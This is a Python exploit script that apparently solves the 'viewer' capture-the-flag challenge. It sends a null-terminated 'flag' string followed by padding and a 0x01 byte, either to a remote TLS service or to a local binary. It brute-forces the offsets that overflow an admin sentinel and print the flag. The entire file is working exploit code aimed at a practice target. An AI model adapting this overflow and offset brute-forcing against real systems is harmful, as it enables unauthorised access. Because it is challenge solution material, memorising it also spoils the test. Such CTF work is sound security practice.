#!/usr/bin/env python3
# Exploit viewer by overflowing the admin sentinel and forcing the flag path.
DESCRIPTION = "Exploit viewer by overflowing the admin sentinel and forcing the flag path."

from __future__ import annotations

import argparse
import re
import socket
import ssl
import subprocess
from typing import Iterable

HOST = "viewer.challs.pwnoh.io"
PORT = 1337
FLAG_RE = re.compile(r"bctf\{[^}]+\}")
PROMPT = b"> "


# TLS connection wrapper used by viewer exploit flows.
class RemoteConnection:
    # Establish a TLS-wrapped socket to the host.
    def __init__(self, host: str, port: int, timeout: float | None = None):
        context = ssl.create_default_context()
        raw = socket.create_connection((host, port), timeout=timeout)
        self.sock = context.wrap_socket(raw, server_hostname=host)

    # Receive data until the supplied marker appears.
    def recv_until(self, marker: bytes) -> bytes:
        buf = bytearray()
        while marker not in buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            buf.extend(chunk)
        return bytes(buf)

    # Consume all remaining bytes from the socket.
    def recv_all(self) -> bytes:
        data = bytearray()
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)

    # Send a payload to the remote connection.
    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    # Close the socket gracefully.
    def close(self) -> None:
        self.sock.close()


# Run the local challenge binary with the overflow payload.
def run_local(binary: str, payload: bytes) -> bytes:
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert proc.stdin and proc.stdout
    proc.stdin.write(payload + b"\n")
    proc.stdin.flush()
    output, _ = proc.communicate(timeout=2)
    return output


# Send 'flag' and padding to trigger the admin sentinel overflow.
def try_overflow(offset: int, connection: RemoteConnection) -> bytes:
    payload = b"flag" + b"\x00" + b"A" * offset + b"\x01"
    connection.recv_until(PROMPT)
    connection.send(payload + b"\n")
    return connection.recv_all()


# Try candidate offsets locally or remotely until the flag is retrieved.
def find_flag(local_binary: str | None, offsets: Iterable[int], verbose: bool) -> str:
    for offset in offsets:
        if verbose:
            print(f"[verbose] trying offset {offset}")
        if local_binary:
            body = run_local(local_binary, b"flag" + b"\x00" + b"A" * offset + b"\x01")
        else:
            conn = RemoteConnection(HOST, PORT)
            try:
                body = try_overflow(offset, conn)
            finally:
                conn.close()
        match = FLAG_RE.search(body.decode(errors="ignore"))
        if match:
            return match.group(0)
    raise SystemExit("Failed to recover the flag; try different offsets.")


# Parse CLI options, drive the overflow, and print the flag.
def main() -> int:
    parser = argparse.ArgumentParser(DESCRIPTION)
    parser.add_argument("--local", action="store_true", help="Run against ./chall for testing")
    parser.add_argument("--offsets", type=int, nargs="+", default=list(range(0, 40)))
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    local_target = "./chall" if args.local else None

    flag = find_flag(local_target, args.offsets, args.verbose)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
